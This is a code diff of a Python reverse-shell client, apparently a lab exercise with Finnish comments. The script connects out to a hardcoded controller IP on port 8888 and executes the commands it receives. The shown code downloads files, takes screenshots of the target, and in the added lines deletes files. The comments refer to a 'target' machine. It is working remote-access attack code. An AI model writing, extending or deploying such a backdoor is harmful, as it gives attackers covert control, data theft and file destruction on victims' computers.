@@ -1,8 +1,15 @@
 import socket
 import subprocess
 import os
-#pip/pip3 install pillow -kuvankaappaukseen
-from PIL import ImageGrab
+import pyautogui
+
+def delete(s, command):
+    filename = command.split()[1]
+    if os.path.exists(filename):
+        os.remove(filename)
+        s.send(b'tiedosto tuhottu')
+    else:
+        s.send(b'tiedostoa ei loytynyt')
 
 def download(s,command):
     #otetaan tedoston nimi talteen(index[1]), splittamalla välilyönnistä
@@ -40,7 +47,7 @@ def aja_komento(s,command):
 
 def main():
     #vaihda oma ip
-    host_ip = '192.168.56.1'
+    host_ip = '172.20.16.66'
     port    = 8888
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host_ip, port))
@@ -56,11 +63,11 @@ def main():
             vaihda_dirri(s,command)
         elif command.startswith('download'):
             download(s,command)
-        elif command.startswith('screen'):
-            #valmis luokka tallentaa screenshotin. 
-            # --> poistetaan se targetilta myöhemmin
-            ImageGrab.grab().save('screen.jpg','JPEG')
-            download(s,'grab screen.jpg')
+        elif command == 'screen':
+            screenshot = pyautogui.screenshot()
+            screenshot.save("screenshot.png")
+        elif command.startswith('del'):
+            delete(s,command)
         else:
              aja_komento(s,command)
      
